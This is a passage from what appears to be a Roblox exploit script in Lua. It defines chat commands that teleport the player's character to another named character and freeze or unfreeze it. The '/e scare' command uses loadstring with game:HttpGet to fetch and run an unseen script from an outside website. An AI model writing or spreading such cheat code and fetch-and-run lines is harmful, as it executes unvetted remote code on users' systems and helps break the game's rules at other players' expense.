      local ME = game:GetService("Workspace").revsteppinsstand.Torso.CFrame
      game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = ME
      wait(0.5)
      game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
 end
 
 
 
 if msg:lower():sub(1,13) == "/e scare" then
  loadstring(game:HttpGet("https://guard.lol/scripts/universalscript.lua",true))()
 end
 
 if msg:lower():sub(1,13) == "/e unfreeze" then
game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
 end
 
